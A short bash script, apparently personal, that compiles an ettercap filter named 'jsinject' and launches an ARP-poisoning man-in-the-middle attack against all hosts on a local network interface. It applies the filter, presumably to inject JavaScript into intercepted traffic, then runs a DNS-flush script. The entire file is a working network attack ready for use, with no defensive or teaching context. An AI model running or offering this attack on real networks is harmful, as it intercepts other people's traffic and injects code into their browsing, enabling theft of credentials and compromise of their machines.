#!/bin/bash
etterfilter jsinject.filter -o jsinject.ef
sudo ettercap -T -q -i wlp2s0 -F jsinject.ef -M arp /// ///
/home/eddy/programming/bash/flushdns.sh
